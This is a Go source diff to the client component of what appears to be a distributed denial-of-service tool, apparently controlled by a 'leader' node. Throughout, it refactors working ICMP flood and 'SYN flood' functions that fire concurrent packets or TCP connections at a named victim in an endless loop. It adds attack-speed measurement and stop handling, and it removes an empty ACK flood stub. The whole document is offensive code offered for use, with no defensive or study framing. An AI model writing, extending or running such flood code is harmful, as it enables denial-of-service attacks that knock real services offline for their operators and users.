@@ -1,8 +1,6 @@
 package client
 
 import (
-	"fmt"
-	"github.com/fatih/color"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 	"net"
@@ -11,18 +9,16 @@ import (
 	"time"
 )
 
-func StartAttack(victim string, ddosType string, stopchan chan bool, logChan chan string) {
+func (c *Client) StartAttack(victim string, ddosType string, stopchan chan bool, logChan chan string) {
 	if ddosType == "ICMP" {
 		//ip without port
 		ip := strings.Split(victim, ":")[0]
-		go ICMPFlood(ip, stopchan, logChan)
+		go c.ICMPFlood(ip, stopchan, logChan)
 	} else if ddosType == "SYN" {
-		go SYNFlood(victim, stopchan)
-	} else if ddosType == "ACK" {
-		go ACKFlood(victim)
+		go c.SYNFlood(victim, stopchan, logChan)
 	}
 }
-func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
+func (c *Client) ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 	var maxChannelsNb = 20
 	var channels = make(chan struct{}, maxChannelsNb)
 
@@ -31,22 +27,25 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 	// open a connection to the server
 	conn, err := net.DialIP("ip4:icmp", nil, ipAddr)
 	if err != nil {
-		color.Red("Error Dialing : %s", err)
-		return
+		if strings.Contains(err.Error(), "permitted") {
+			logChan <- "You don't have permission\n to send ICMP packets"
+			return
+		}
 	}
 	defer conn.Close()
-
+	var requestCount uint64 = 0
+	start := time.Now()
 	for {
 		channels <- struct{}{}
 		select {
 		case isStop := <-stopChan:
 			if isStop {
-				logChan <- "Stopping attack"
+				logChan <- "Stopping the attack"
 				stopChan <- false
+				c.Speed = 0
 				return
 			}
 			//continue to default
-
 		default:
 			if !blocked {
 				go func() {
@@ -60,9 +59,17 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 							blocked = false
 						}
 					}
+					requestCount++
 					<-channels
 				}()
 			}
+		}
+		elapsed := time.Since(start)
+		if elapsed.Seconds() > 0.5 {
+			speed := int(float64(requestCount) / elapsed.Seconds())
+			c.Speed = speed
+			start = time.Now()
+			requestCount = 0
 		}
 	}
 }
@@ -96,15 +103,27 @@ func SendICMP(message *icmp.Message, conn *net.IPConn) error {
 	return nil
 }
 
-func SYNFlood(victim string, stop chan bool) {
+func (c *Client) SYNFlood(victim string, stopChan chan bool, logChan chan string) {
+	logChan <- "Starting SYN flood attack"
 	var maxChannelsNb = 20
 	var channels = make(chan struct{}, maxChannelsNb)
+	//check if port is specified
+	if !strings.Contains(victim, ":") {
+		victim = victim + ":80"
+		logChan <- "leader does not specify port\n using port 80"
+	}
+	var requestCount int = 0
+	start := time.Now()
 	for {
 		channels <- struct{}{}
 		select {
-		case <-stop:
-			<-stop
-			return
+		case isStop := <-stopChan:
+			if isStop {
+				logChan <- "Stopping attack"
+				stopChan <- false
+				c.Speed = 0
+				return
+			}
 		default:
 			go func() {
 				conn, err := net.Dial("tcp", victim)
@@ -112,18 +131,22 @@ func SYNFlood(victim string, stop chan bool) {
 				if err == nil {
 					err := conn.Close()
 					if err != nil {
-						return
+						logChan <- "error sending SYN flood request"
 					}
 				}
 				if err != nil {
-					fmt.Println("Error:", err)
+					logChan <- "error sending SYN flood request"
 				}
 				<-channels
+				requestCount++
 			}()
 		}
+		elapsed := time.Since(start)
+		if elapsed.Seconds() > 0.5 {
+			speed := int(float64(requestCount) / elapsed.Seconds())
+			c.Speed = speed
+			start = time.Now()
+			requestCount = 0
+		}
 	}
-}
-
-func ACKFlood(server string) {
-	//SOON
 }
